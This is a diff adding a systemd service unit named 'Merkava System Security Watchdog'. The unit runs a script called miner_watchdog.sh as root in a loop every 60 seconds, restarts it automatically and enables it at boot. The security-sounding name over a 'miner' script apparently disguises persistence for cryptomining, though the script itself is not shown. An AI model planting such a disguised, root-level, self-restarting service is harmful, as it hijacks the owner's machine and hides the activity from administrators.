@@ -1,0 +1,13 @@
+[Unit]
+Description=Merkava System Security Watchdog
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c "while true; do /usr/local/bin/miner_watchdog.sh; sleep 60; done"
+Restart=always
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
